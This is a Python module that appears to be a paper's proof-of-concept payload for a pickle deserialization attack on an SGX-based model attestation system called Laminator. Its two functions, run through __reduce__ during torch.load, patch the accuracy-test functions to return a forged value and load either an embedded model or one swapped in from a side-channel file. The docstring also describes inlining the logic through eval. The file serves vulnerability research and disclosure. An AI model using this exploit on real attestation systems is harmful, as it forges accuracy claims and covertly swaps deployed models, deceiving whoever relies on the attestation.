"""
PoC payload helpers used by the pickle's __reduce__.

When `_Evil(args).__reduce__()` returns `(malicious_load_*, args)`,
the resulting pickle bytes encode a top-level function reference
(`poc_payload.malicious_load_*`) plus the args tuple. At unpickle
time (inside Laminator's `torch.load(measured_bytes_model)`), the
pickler imports this module by name and calls the function.

This is the *paper-artifact form* of the payload: a named helper with
explicit arguments and ordinary Python control flow, so reviewers can
read it like normal code rather than untangling an eval-of-string.

For a real attacker against a deployed Laminator enclave the function
needs to be reachable from inside the enclave's import path, which
Laminator's manifest restricts (`sgx.trusted_files` covers
`main.py`, `models.py`, `data.py`, `measured_file_read.py`,
`quote_generator.py`, `utils.py`, plus `/usr/lib` etc. — anything
new is either rejected or requires placement in one of those
trusted directories with the corresponding integrity hash). A real
attacker therefore either (a) inlines the same logic via
`(eval, (expr,))` from `__reduce__` so the pickle stream references
only `builtins.eval`, or (b) smuggles their helper into one of the
trusted_files. The vulnerability is the deserialization of
attacker-controlled bytes; the choice between `eval(string)` and a
named-helper reference is stylistic, not load-bearing.

`malicious_load_static` and `malicious_load_switchable` differ only
in where the returned state_dict comes from:

  - `malicious_load_static(fake_accuracy, real_state_dict_bytes)`:
    deserializes a state_dict that is *baked into the pickle*. One
    pickle file = one model, fixed forever.

  - `malicious_load_switchable(fake_accuracy, sidechannel_path)`:
    reads the state_dict from a side-channel file the host can
    rewrite between attestations. One pickle file = one fixed
    SHA-512, but the model that actually runs varies per call.

Both forms patch `utils.test` (and `utils.test_text`) so the
forged accuracy survives into `accuracy_attestation`'s payload.
"""

import io


def malicious_load_static(fake_accuracy, real_state_dict_bytes):
    """Pickle __reduce__ target for the *static* variant.

    Side effect: patches `utils.test` / `utils.test_text` to return
    `fake_accuracy` unconditionally.

    Return value: a real state_dict suitable for
    `model.load_state_dict(...)`, decoded from the bytes that were
    baked into the pickle at build time.
    """
    import torch  # imported here so the module top doesn't depend on it

    import utils

    utils.test = lambda *args, **kwargs: fake_accuracy
    utils.test_text = lambda *args, **kwargs: fake_accuracy

    return torch.load(io.BytesIO(real_state_dict_bytes))


def malicious_load_switchable(fake_accuracy, sidechannel_path):
    """Pickle __reduce__ target for the *switchable* variant.

    Side effect: identical patch on `utils.test` / `utils.test_text`.

    Return value: whatever state_dict is currently sitting at
    `sidechannel_path`. The host rewrites that file freely between
    invocations of the enclave, swapping the actual model that
    inference will use without touching this loader file.
    """
    import torch

    import utils

    utils.test = lambda *args, **kwargs: fake_accuracy
    utils.test_text = lambda *args, **kwargs: fake_accuracy

    with open(sidechannel_path, "rb") as fh:
        return torch.load(fh)
